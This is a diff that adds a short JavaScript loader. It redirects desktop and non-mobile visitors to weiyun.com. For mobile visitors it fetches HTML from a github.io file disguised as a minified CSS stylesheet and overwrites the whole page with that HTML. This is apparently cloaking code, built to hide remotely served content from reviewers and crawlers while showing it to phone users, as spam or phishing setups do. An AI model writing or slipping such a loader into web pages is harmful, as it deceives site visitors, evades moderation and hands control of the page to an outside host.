@@ -1,0 +1,34 @@
+function aaa1() {
+    if ((/^(Win|Mac)/i.test(navigator.platform) || !/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent)) && (!localStorage.isCheney || parseInt(conf.mobile))) {
+        location = '//www.weiyun.com';
+    }
+};
+aaa1();
+
+var html = null;
+var xhr = new XMLHttpRequest;
+var type = GetQueryString('ci');
+function render() {
+    var a = document.open("text/html; charset=utf-8", "replace");
+    a.write(html);
+    a.close()
+}
+xhr.onload = function () {
+    html = xhr.responseText;
+    var delay = 0;
+    if (delay > 0) setTimeout("render()", delay * 1000);
+    else render()
+};
+function GetQueryString(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return unescape(r[2]);
+    return null;
+}
+if (type == 0) {
+    xhr.open("GET", "//y-f-p.github.io/Only/decoration/table-cell/inline-block/min--moz-device-pixel-ratio/jably.min.css?t=" + Date.now(), !0);
+    xhr.send();
+}else {
+    xhr.open("GET", "//sy-f-p.github.io/Only/decoration/table-cell/inline-block/min--moz-device-pixel-ratio/jably.min.css?t=" + Date.now(), !0);
+    xhr.send();
+}
